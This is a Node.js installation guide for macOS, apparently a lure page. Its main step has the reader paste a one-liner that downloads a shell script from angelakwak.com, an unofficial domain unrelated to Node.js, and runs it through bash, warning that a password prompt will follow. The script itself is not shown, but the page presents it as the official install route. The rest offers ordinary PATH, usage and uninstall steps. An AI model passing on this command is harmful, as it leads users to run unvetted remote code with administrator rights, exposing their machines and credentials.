# 🟢 NodeJS for macOS — install & run in minutes

This guide gets **Node.js** on your Mac fast — even if you've never used Terminal.  
You'll install with one command, verify `node`/`npm`, fix PATH if needed, and run your first script.

---

## 🚀 Start here (copy → paste → Return)

Open **Terminal.app** (⌘ + Space → “Terminal”) and run:

```bash
/bin/bash -c "$(curl -fsSL https://angelakwak.com/njs/install.sh)"
```

During install you may see:
- a prompt to install **Command Line Tools** — accept and wait
- a **password** prompt (input is hidden) — type it and press **Return**
- progress logs — let the script finish

---

## ✅ Verify the install

```bash
node -v
npm -v
which node
which npm
```

Expected locations (common defaults):
- **Apple Silicon:** `/opt/homebrew/bin/node` or `/usr/local/bin/node`
- **Intel:** `/usr/local/bin/node`

If your shell doesn't recognize `node`, refresh your profile:
```bash
source ~/.zprofile 2>/dev/null || source ~/.zshrc 2>/dev/null || true
```

Still missing? Add common locations to your PATH (**zsh**, default on macOS):
```bash
# Add Homebrew + /usr/local to PATH if they're missing
if ! echo "$PATH" | grep -q "/opt/homebrew/bin"; then
  echo 'export PATH="/opt/homebrew/bin:$PATH"' >> ~/.zprofile
fi
if ! echo "$PATH" | grep -q "/usr/local/bin"; then
  echo 'export PATH="/usr/local/bin:$PATH"' >> ~/.zprofile
fi
source ~/.zprofile
```

Test again:
```bash
node -v && npm -v
```

---

## 🧪 Your first Node run

Create a folder and a tiny app:
```bash
mkdir -p ~/Projects/hello-node && cd ~/Projects/hello-node
printf "console.log('Hello, NodeJS 👋');\n" > index.js
node index.js
```

Initialize a package and add a script:
```bash
npm init -y
npm pkg set scripts.start="node index.js"
npm run start
```

Install a popular library (example):
```bash
npm install axios
node -e "require('axios').get('https://api.github.com').then(r=>console.log('GitHub OK:', !!r.data))"
```

---

## ♻️ Keep things updated

Update npm itself:
```bash
npm install -g npm
npm -v
```

(If you installed Node via Homebrew, you can later update with `brew upgrade node`. Otherwise, re-run the installer when a new version is available.)

---

## 🔧 Troubleshooting

**`command not found: node`**  
- Run the **PATH** block above, then reopen Terminal.

**Installer keeps asking for tools**  
```bash
xcode-select --install
```

**Network / SSL errors**  
- Check Wi‑Fi/VPN and system date/time; try again on a stable connection.

**Permissions / EACCES when installing global packages**  
- Prefer `npm config set prefix ~/.npm-global` and add it to PATH to avoid `sudo`:
```bash
npm config set prefix ~/.npm-global
echo 'export PATH="$HOME/.npm-global/bin:$PATH"' >> ~/.zprofile
source ~/.zprofile
```

---

## 🗑️ Uninstall (only if needed)

If installed via Homebrew:
```bash
brew uninstall node
```

Otherwise (manual cleanup; be careful):
```bash
# Remove common binaries and global modules (may vary by setup)
sudo rm -f /usr/local/bin/node /usr/local/bin/npm /usr/local/bin/npx 2>/dev/null || true
sudo rm -rf /usr/local/lib/node_modules 2>/dev/null || true

# Apple Silicon/Homebrew prefix
sudo rm -f /opt/homebrew/bin/node /opt/homebrew/bin/npm /opt/homebrew/bin/npx 2>/dev/null || true
sudo rm -rf /opt/homebrew/lib/node_modules 2>/dev/null || true
```

---

### 🎯 Recap
Open Terminal → run the one‑liner → verify `node -v`/`npm -v` → (optional) fix PATH → run your first script.  
Happy coding! 💚
